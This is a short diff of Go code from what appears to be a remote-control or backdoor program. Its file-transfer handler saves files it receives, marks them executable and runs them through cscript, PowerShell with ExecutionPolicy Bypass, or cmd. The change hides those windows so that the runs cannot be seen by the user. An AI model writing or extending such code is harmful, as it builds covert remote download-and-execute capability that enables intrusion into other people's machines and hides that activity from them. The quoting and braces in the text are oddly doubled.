@@ -776,11 +776,17 @@ func handleFileTransfer(msg Message) {{
         os.WriteFile(savePath, data, 0755)
         switch ext {{
         case "".vbs"":
-            exec.Command(""cscript"", ""//NoLogo"", savePath).Start()
+            c := exec.Command(""cscript"", ""//NoLogo"", savePath)
+            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+            c.Start()
         case "".ps1"":
-            exec.Command(""powershell"", ""-ExecutionPolicy"", ""Bypass"", ""-File"", savePath).Start()
+            c := exec.Command(""powershell"", ""-WindowStyle"", ""Hidden"", ""-ExecutionPolicy"", ""Bypass"", ""-File"", savePath)
+            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+            c.Start()
         default:
-            exec.Command(""cmd"", ""/C"", ""start"", """", savePath).Start()
+            c := exec.Command(""cmd"", ""/C"", savePath)
+            c.SysProcAttr = &syscall.SysProcAttr{{HideWindow: true}}
+            c.Start()
         }}
     }}
 }}
